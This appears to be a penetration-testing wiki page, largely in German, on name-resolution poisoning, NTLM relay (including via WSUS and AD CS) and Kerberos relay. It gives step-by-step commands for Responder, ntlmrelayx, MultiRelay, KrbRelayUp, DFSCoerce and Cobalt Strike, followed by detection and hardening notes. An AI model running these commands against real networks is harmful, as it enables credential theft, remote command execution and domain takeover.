# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Netzwerkprotokolle

### Lokale Host-Auflösungsprotokolle

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft und andere Betriebssysteme verwenden LLMNR und NBT-NS zur lokalen Namensauflösung, wenn DNS fehlschlägt. Ähnlich verwenden Apple- und Linux-Systeme mDNS.
- Diese Protokolle sind aufgrund ihres unauthentifizierten, broadcast-basierten Charakters über UDP anfällig für Abfangen und Spoofing.
- [Responder](https://github.com/lgandx/Responder) und [Dementor](https://github.com/MatrixEditor/Dementor) können verwendet werden, um Dienste zu imitieren, indem gefälschte Antworten an Hosts gesendet werden, die diese Protokolle abfragen.
- Weitere Informationen zur Dienst-Imitation mit Responder finden sich [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD ermöglicht es Browsern, Proxy-Einstellungen automatisch zu entdecken.
- Die Entdeckung erfolgt über DHCP, DNS oder als Rückfall über LLMNR und NBT-NS, wenn DNS fehlschlägt.
- Responder kann WPAD-Angriffe automatisieren und Clients auf bösartige WPAD-Server umleiten.

### Responder/Dementor für Protocol Poisoning

- **Responder** ist ein Tool zum Poisoning von LLMNR-, NBT-NS- und mDNS-Abfragen, das selektiv basierend auf Abfragetypen antwortet und hauptsächlich SMB-Dienste anvisiert.
- Es ist in Kali Linux vorinstalliert und in `/etc/responder/Responder.conf` konfigurierbar.
- Responder zeigt erfasste Hashes auf dem Bildschirm an und speichert sie im Verzeichnis `/usr/share/responder/logs`.
- Es unterstützt sowohl IPv4 als auch IPv6.
- Eine Windows-Version von Responder ist [here](https://github.com/lgandx/Responder-Windows) verfügbar.

- **Dementor** erweitert die Themen multicast poisoning und fungiert zusätzlich als rogue service provider (inklusive CUPS RCE-Unterstützung).
- Die Gesamtstruktur ähnelt **Responder** mit feingranularerer Konfiguration. (Default ist hier: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Kompatibilität zwischen **Dementor** und **Responder** ist hier zu finden: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Intro und Dokumentation hier: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Behebt Capture-Probleme, die Responder bei bestimmten Protokollen eingeführt hat

#### Responder ausführen

- Um Responder mit Standard-Einstellungen auszuführen: `responder -I <Interface>`
- Für aggressiveres Probing (mit potentiellen Nebenwirkungen): `responder -I <Interface> -P -r -v`
- Techniken zum Erfassen von NTLMv1-Challenges/Responses für einfacheres Cracking: `responder -I <Interface> --lm --disable-ess`
- WPAD-Imitation kann aktiviert werden mit: `responder -I <Interface> --wpad`
- NetBIOS-Anfragen können auf die IP des Angreifers aufgelöst werden und ein Authentifizierungs-Proxy kann eingerichtet werden: `responder.py -I <interface> -Pv`

#### Dementor ausführen

- Mit Standard-Einstellungen: `Dementor -I <interface>`
- Mit Standard-Einstellungen im Analysis-Modus: `Dementor -I <interface> -A`
- Automatisches NTLM-Session-Downgrade (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Aktuelle Session mit benutzerdefinierter Konfiguration ausführen: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning mit Responder

- Das Spoofen von DHCP-Antworten kann die Routing-Informationen eines Opfers dauerhaft vergiften und bietet eine unauffälligere Alternative zu ARP-Poisoning.
- Es erfordert genaue Kenntnis der Konfiguration des Zielnetzwerks.
- Ausführung des Angriffs: `./Responder.py -I eth0 -Pdv`
- Diese Methode kann effektiv NTLMv1/2-Hashes erfassen, erfordert jedoch sorgfältiges Vorgehen, um Netzstörungen zu vermeiden.

### Erfassen von Anmeldeinformationen mit Responder/Dementor

- Responder/Dementor werden Dienste mittels der oben genannten Protokolle imitieren und Anmeldeinformationen erfassen (üblicherweise NTLMv2 Challenge/Response), wenn ein Benutzer versucht, sich gegen die gefälschten Dienste zu authentifizieren.
- Es können Versuche unternommen werden, auf NetNTLMv1 downzugraden oder ESS zu deaktivieren, um das Cracking zu erleichtern.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Es ist entscheidend zu beachten, dass der Einsatz dieser Techniken legal und ethisch erfolgen muss, mit entsprechender Autorisierung und unter Vermeidung von Störungen oder unbefugtem Zugriff.

## Inveigh

Inveigh ist ein Tool für penetration tester und red teamer, konzipiert für Windows-Systeme. Es bietet ähnliche Funktionalitäten wie Responder und führt Spoofing- sowie Man-in-the-Middle-Angriffe durch. Das Tool hat sich von einem PowerShell-Skript zu einer C#-Binary entwickelt, mit [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) und [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) als den Hauptversionen. Detaillierte Parameter und Anleitungen sind im [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) zu finden.

Inveigh kann über PowerShell betrieben werden:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Oder als C# binary ausgeführt:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Dieser Angriff nutzt SMB-Authentifizierungssitzungen, um auf eine Zielmaschine zuzugreifen und bei Erfolg eine System-Shell zu erhalten. Wichtige Voraussetzungen sind:

- Der authentifizierende Benutzer muss Local Admin access auf dem relayed Host haben.
- SMB signing sollte deaktiviert sein.

#### 445 Port Forwarding and Tunneling

In Szenarien, in denen ein direkter Netzwerkzugang nicht möglich ist, muss der Verkehr auf Port 445 weitergeleitet und getunnelt werden. Tools like [**PortBender**](https://github.com/praetorian-inc/PortBender) helfen dabei, den Verkehr von Port 445 auf einen anderen Port umzuleiten, was wichtig ist, wenn Local Admin access für das Laden von Treibern vorhanden ist.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Weitere Tools für NTLM Relay Attack

- **Metasploit**: Mit Proxies sowie lokalen und entfernten Host-Details konfigurieren.
- **smbrelayx**: Ein Python-Skript zum Weiterleiten von SMB-Sitzungen und zum Ausführen von Befehlen oder Bereitstellen von Backdoors.
- **MultiRelay**: Ein Tool aus der Responder-Suite, um bestimmte Benutzer oder alle Benutzer weiterzuleiten, Befehle auszuführen oder Hashes auszulesen.

Jedes Tool kann bei Bedarf so konfiguriert werden, dass es über einen SOCKS proxy läuft, wodurch Angriffe auch bei indirektem Netzwerkzugang möglich sind.

### MultiRelay-Betrieb

MultiRelay wird aus dem Verzeichnis _**/usr/share/responder/tools**_ ausgeführt und richtet sich an bestimmte IPs oder Benutzer.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Diese Tools und Techniken bilden ein umfassendes Set zum Durchführen von NTLM Relay-Angriffen in verschiedenen Netzwerkumgebungen.

### Abusing WSUS HTTP (8530) for NTLM Relay to LDAP/SMB/AD CS (ESC8)

WSUS-Clients authentifizieren sich beim Update-Server mit NTLM über HTTP (8530) oder HTTPS (8531). Wenn HTTP aktiviert ist, können periodische Client-Check-ins im lokalen Segment erzwungen oder abgefangen und mit ntlmrelayx zu LDAP/LDAPS/SMB- oder AD CS-HTTP-Endpunkten (ESC8) weitergeleitet werden, ohne Hashes knacken zu müssen. Das fügt sich in normalen Update-Verkehr ein und liefert häufig Machine-Account-Authentifizierungen (HOST$).

Worauf zu achten ist
- GPO/Registry-Konfiguration unter HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate und ...\WindowsUpdate\AU:
- WUServer (z. B. http://wsus.domain.local:8530)
- WUStatusServer (Reporting-URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled und DetectionFrequency (Stunden)
- WSUS SOAP-Endpunkte, die Clients über HTTP verwenden:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Standard-Ports: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Nicht authentifiziert
- Scan nach Listenern: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniffen von HTTP-WSUS-Verkehr via L2 MITM und aktive Clients/Endpunkte mit wsusniff.py protokollieren (nur HTTP, sofern Sie den Clients nicht Ihr TLS-Zertifikat vertrauenswürdig machen).
- Authentifiziert
- SYSVOL-GPOs nach WSUS-Schlüsseln parsen mit MANSPIDER + regpol (wsuspider.sh Wrapper fasst WUServer/WUStatusServer/UseWUServer zusammen).
- Endpunkte großflächig von Hosts (NetExec) oder lokal abfragen:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) Positionieren Sie sich für einen MITM (gleiches L2), sodass ein Client den WSUS-Server auf Sie auflöst (ARP/DNS Poisoning, Bettercap, mitm6, etc.). Beispiel mit arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Leiten Sie Port 8530 auf Ihren Relay-Listener um (optional, praktisch):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Starten Sie ntlmrelayx mit dem HTTP-Listener (erfordert Impacket-Unterstützung für HTTP-Listener; siehe PRs unten):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Weitere gängige Ziele:
- Relay zu SMB (wenn Signing aus) für Exec/Dump: -t smb://<host>
- Relay zu LDAPS für Verzeichnisänderungen (z. B. RBCD): -t ldaps://<DC>
- Relay zu AD CS Web Enrollment (ESC8), um ein Zertifikat zu minted und sich dann via Schannel/PKINIT zu authentifizieren:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
Für tiefere AD CS-Abuse-Pfade und Tooling siehe die AD CS-Seite:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Lösen Sie ein Client-Check-in aus oder warten Sie auf den Zeitplan. Vom Client:
wuauclt.exe /detectnow
oder nutzen Sie die Windows Update UI (Check for updates).

5) Nutzen Sie die authentifizierten SOCKS-Sessions (falls -socks) oder die direkten Relay-Ergebnisse für Post-Exploitation (LDAP-Änderungen, SMB-Operationen oder AD CS-Zertifikatsausstellung für spätere Authentifizierung).

HTTPS constraint (8531)
- Passives Abfangen von WSUS über HTTPS ist unwirksam, solange Clients Ihrem Zertifikat nicht vertrauen. Ohne ein vertrauenswürdiges Zertifikat oder einen anderen TLS-Break kann der NTLM-Handshake aus WSUS-HTTPS-Verkehr nicht geerntet/relayed werden.

Anmerkungen
- WSUS wurde als deprecated angekündigt, ist aber weiterhin weit verbreitet; HTTP (8530) ist in vielen Umgebungen noch üblich.
- Nützliche Helfer: wsusniff.py (beobachtet HTTP-WSUS-Check-ins), wsuspider.sh (enumiert WUServer/WUStatusServer aus GPOs), NetExec reg-query für großflächige Abfragen.
- Impacket stellte HTTP-Listener-Unterstützung für ntlmrelayx in PR #2034 wieder her (ursprünglich in PR #913 hinzugefügt).

### Force NTLM Logins

In Windows können Sie **unter Umständen einige privilegierte Accounts dazu zwingen, sich an beliebigen Maschinen zu authentifizieren**. Lesen Sie die folgende Seite, um zu erfahren wie:

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** stiehlt ein **AP-REQ ticket** von einem Service und verwendet es gegen einen zweiten Service wieder, der denselben **Computer-Account-Schlüssel** teilt (weil beide SPNs auf demselben `$`-Machine-Account liegen). Das funktioniert, obwohl die Service-Klassen der SPNs unterschiedlich sind (z. B. `CIFS/` → `LDAP/`), weil der *Schlüssel*, der das Ticket entschlüsselt, der NT-Hash der Maschine ist — nicht der SPN-String selbst — und der SPN-String kein Teil der Signatur ist.

Im Gegensatz zum NTLM-Relay ist der Hop auf denselben Host beschränkt, aber wenn Sie ein Protokoll anvisieren, das Schreibzugriff auf LDAP erlaubt, können Sie in **Resource-Based Constrained Delegation (RBCD)** oder **AD CS enrollment** kaskadieren und **NT AUTHORITY\SYSTEM** in einem einzigen Schritt erlangen.

Für detaillierte Informationen zu diesem Angriff siehe:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Beweist den Benutzer gegenüber dem KDC | unverändert |
| **Service ticket / TGS-REQ ↔ REP** | An ein **SPN** gebunden; mit dem Schlüssel des SPN-Inhabers verschlüsselt | austauschbar, wenn SPNs zum selben Konto gehören |
| **AP-REQ** | Client sendet `TGS` an den Service | **was wir stehlen & wiederverwenden** |

* Tickets sind mit dem **password-derived key des Accounts, der das SPN besitzt**, verschlüsselt.
* Der **Authenticator** innerhalb des AP-REQ enthält einen 5-Minuten-Timestamp; ein Replay innerhalb dieses Fensters ist gültig, bis der Service-Cache ein Duplikat erkennt.
* Windows prüft selten, ob der SPN-String im Ticket mit dem Service übereinstimmt, den Sie ansprechen, sodass ein Ticket für `CIFS/HOST` normalerweise auch auf `LDAP/HOST` korrekt entschlüsselt wird.

- 2. **Voraussetzungen für Kerberos-Relay**

1. **Shared key:** Source- und Ziel-SPNs gehören zum selben Computer-Account (Standard auf Windows-Servern).
2. **No channel protection:** SMB/LDAP-Signing aus und EPA für HTTP/LDAPS aus.
3. **You can intercept or coerce authentication:** LLMNR/NBNS Poisoning, DNS-Spoofing, **PetitPotam / DFSCoerce RPC**, gefälschtes AuthIP, rogue DCOM, etc.
4. **Ticket source not already used:** Sie müssen das Rennen gewinnen, bevor das echte Paket ankommt, oder es vollständig blockieren; andernfalls löst der Replay-Cache des Servers Event 4649 aus.
5. Sie müssen auf irgendeine Weise einen **MitM in der Kommunikation** durchführen können — z. B. Mitglied der DNSAdmins-Gruppe sein, um die DNS der Domain zu ändern, oder die HOSTS-Datei des Opfers ändern können.

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Starte den Relay-Listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` verpackt **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** in einer einzigen Binärdatei.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce veranlasst den DC, uns ein Kerberos `CIFS/DC01` ticket zu senden.

- 3.4 **AP-REQ weiterleiten**

KrbRelay extrahiert den GSS blob aus SMB, verpackt ihn in ein LDAP bind und leitet ihn an `ldap://DC01` weiter—die Authentifizierung gelingt, weil der **derselbe Schlüssel** ihn entschlüsselt.

- 3.5 **LDAP missbrauchen ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Du hast jetzt **NT AUTHORITY\SYSTEM**.


### **Weitere Pfade, die man kennen sollte**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Fake server sends a **GSS-ID payload** with any SPN; client builds an AP-REQ straight to you | Works even across subnets; machine creds by default |
| **DCOM / MSRPC** | Malicious OXID resolver forces client to auth to arbitrary SPN and port | Pure *lokale* priv-esc; sidesteps firewall |
| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` and get a cert, then **PKINIT** to mint TGTs | Bypasses LDAP signing defenses |
| **Shadow Credentials** | Write `msDS-KeyCredentialLink`, then PKINIT with forged key pair | No need to add a computer account |

### **Troubleshooting**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Ticket-Schlüssel ≠ Zielschlüssel | Falscher Host/SPN |
| `KRB_AP_ERR_SKEW` | Uhrzeit > 5 min Abweichung | Zeit synchronisieren oder `w32tm` verwenden |
| LDAP-Bind schlägt fehl | Signierung erzwungen | AD CS-Pfad verwenden oder Signierung deaktivieren |
| Event 4649-Spam | Dienst sah doppelten Authenticator | Originalpaket blockieren oder das Rennen gegen das Originalpaket gewinnen |


### **Erkennung**

* Anstieg bei **Event 4769** für `CIFS/`, `HTTP/`, `LDAP/` von derselben Quelle innerhalb von Sekunden.
* **Event 4649** auf dem Dienst deutet auf erkannten Replay hin.
* Kerberos-Anmeldung von **127.0.0.1** (Relay zum lokalen SCM) ist sehr verdächtig — mittels Sigma-Regel in den KrbRelayUp-Dokumenten abbilden.
* Achten Sie auf Änderungen an `msDS-AllowedToActOnBehalfOfOtherIdentity` oder `msDS-KeyCredentialLink` Attributen.

## **Härtung**

1. **LDAP- & SMB-Signierung + EPA erzwingen** auf jedem Server.
2. **SPNs aufteilen**, sodass HTTP nicht auf demselben Konto wie CIFS/LDAP liegt.
3. Patchen Sie Coercion-Vektoren (PetitPotam KB5005413, DFS, AuthIP).
4. Setzen Sie **`ms-DS-MachineAccountQuota = 0`**, um unerlaubte Computer-Joinvorgänge zu verhindern.
5. Alarm bei **Event 4649** und unerwarteten Loopback-Kerberos-Anmeldungen.



## Referenzen

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
